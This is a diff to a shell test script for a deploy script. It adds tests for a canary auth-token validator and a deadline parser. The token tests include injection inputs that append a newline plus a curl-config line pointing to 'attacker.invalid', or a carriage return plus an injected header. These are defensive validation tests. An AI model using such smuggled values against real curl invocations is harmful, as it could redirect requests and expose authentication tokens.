@@ -171,6 +171,57 @@ grep -q 'CATALOG_CANARY_PROVIDER_ID is required' "$DEPLOY_SH" ||
 grep -q 'CATALOG_CANARY_AUTH_TOKEN is required' "$DEPLOY_SH" ||
   fail "deploy must require authenticated canary evidence"
 
+token_validator_tmp="$(mktemp)"
+trap 'rm -f "$token_validator_tmp"' EXIT
+awk '/^_validate_catalog_canary_auth_token\(\) \{/{f=1} f{print} f&&/^\}$/{exit}' "$DEPLOY_SH" > "$token_validator_tmp"
+grep -qF '_validate_catalog_canary_auth_token()' "$token_validator_tmp" ||
+  fail "deploy must keep an extractable portable canary token validator"
+# BSD grep rejects interval upper bounds greater than 255. Length checks belong
+# in Bash so the production deploy remains portable on the operator Mac.
+if grep -qF '{32,512}' "$DEPLOY_SH"; then
+  fail "deploy must not use a BSD-grep-incompatible {32,512} interval"
+fi
+# shellcheck disable=SC1090
+. "$token_validator_tmp"
+token_31="$(printf '%031d' 0)"
+token_32="$(printf '%032d' 0)"
+token_512="$(printf '%0512d' 0)"
+token_513="$(printf '%0513d' 0)"
+! _validate_catalog_canary_auth_token "$token_31" ||
+  fail "canary token validator must reject 31-byte tokens"
+_validate_catalog_canary_auth_token "$token_32" ||
+  fail "canary token validator must accept safe 32-byte tokens"
+_validate_catalog_canary_auth_token "$token_512" ||
+  fail "canary token validator must accept safe 512-byte tokens"
+! _validate_catalog_canary_auth_token "$token_513" ||
+  fail "canary token validator must reject 513-byte tokens"
+! _validate_catalog_canary_auth_token "${token_32}!" ||
+  fail "canary token validator must reject unsafe characters"
+! _validate_catalog_canary_auth_token "${token_32}"$'\n''url = "https://attacker.invalid/"' ||
+  fail "canary token validator must reject newline curl-config injection"
+! _validate_catalog_canary_auth_token "${token_32}"$'\r''header = "X-Injected: yes"' ||
+  fail "canary token validator must reject carriage-return curl-config injection"
+
+deadline_parser_tmp="$(mktemp)"
+trap 'rm -f "$token_validator_tmp" "$deadline_parser_tmp"' EXIT
+awk '/^_parse_model_hash_legacy_until\(\) \{/{f=1} f{print} f&&/^\}$/{exit}' "$DEPLOY_SH" > "$deadline_parser_tmp"
+grep -qF '_parse_model_hash_legacy_until()' "$deadline_parser_tmp" ||
+  fail "deploy must keep an extractable MODEL_HASH_LEGACY_UNTIL parser"
+# shellcheck disable=SC1090
+. "$deadline_parser_tmp"
+deadline='2030-01-02T03:04:05Z'
+[ "$(_parse_model_hash_legacy_until "  $deadline  ")" = "$deadline" ] ||
+  fail "legacy deadline parser must accept an unquoted scalar"
+[ "$(_parse_model_hash_legacy_until "  \"$deadline\"  ")" = "$deadline" ] ||
+  fail "legacy deadline parser must strip matching double quotes"
+[ "$(_parse_model_hash_legacy_until "  '$deadline'  ")" = "$deadline" ] ||
+  fail "legacy deadline parser must strip matching single quotes"
+[ -z "$(_parse_model_hash_legacy_until '   ')" ] ||
+  fail "legacy deadline parser must preserve an absent deadline as empty"
+if _parse_model_hash_legacy_until '2030-01-02T03:04:05Z trailing' >/dev/null 2>&1; then
+  fail "legacy deadline parser must reject multiple scalar tokens"
+fi
+
 grep -q 'CATALOG_CANARY_SSH_TARGET is required' "$DEPLOY_SH" ||
   fail "deploy must require a trusted canary host for exact installed-byte verification"
 
